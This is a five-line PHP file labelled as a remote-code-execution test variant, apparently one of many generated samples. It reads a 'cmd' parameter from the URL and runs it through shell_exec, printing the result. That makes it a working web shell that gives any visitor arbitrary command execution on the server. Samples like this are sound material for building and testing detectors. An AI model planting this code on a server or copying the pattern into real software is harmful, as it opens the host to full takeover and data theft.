<?php
// RCE test variation #1451
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>